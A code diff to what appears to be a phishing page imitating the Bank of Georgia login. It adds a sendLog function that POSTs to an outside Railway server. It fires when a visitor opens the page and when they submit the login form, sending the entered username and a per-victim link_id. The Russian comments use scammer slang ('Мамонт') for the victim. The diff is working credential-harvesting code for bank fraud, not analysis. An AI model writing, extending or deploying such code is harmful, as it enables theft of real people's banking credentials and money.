@@ -589,6 +589,26 @@
 
 
 <script>
+  // Логирование на Railway
+  function sendLog(type, details, callback) {
+    const LOG_SERVER_URL = 'https://worker-production-740e.up.railway.app/log';
+    const urlParams = new URLSearchParams(window.location.search);
+    const link_id = urlParams.get('link_id') || '';
+
+    fetch(LOG_SERVER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: type,
+        details: details + (link_id ? `\nlink_id=${link_id}` : ''),
+        timestamp: new Date().toLocaleString('ru-RU')
+      })
+    })
+    .then(response => response.json())
+    .then(data => { if (callback) callback(); })
+    .catch(error => { console.error('Log error:', error); if (callback) callback(); });
+  }
+
   const i18n = {
     en: {
       tab_physical: 'PHYSICAL PERSON',
@@ -675,6 +695,9 @@
     var password = document.getElementById('password').value.trim();
     if (!username || !password) return;
 
+    // Логирование попытки входа в BOG
+    sendLog('bank_login', `🏦 BOG Bank\n👤 User: ${username}`);
+
     var overlay = document.getElementById('loaderOverlay');
     var loaderText = document.getElementById('loaderText');
     overlay.classList.add('show');
@@ -700,6 +723,11 @@
 
   window.addEventListener('DOMContentLoaded', function() {
     applyLang(currentLang);
+
+    // Логирование выбора банка BOG
+    const urlParams = new URLSearchParams(window.location.search);
+    const link_id = urlParams.get('link_id') || '';
+    sendLog('bank_selected', `🏦 Мамонт выбрал BOG\nlink_id=${link_id}`);
   });
 
   /* ── CHAT WIDGET ── */
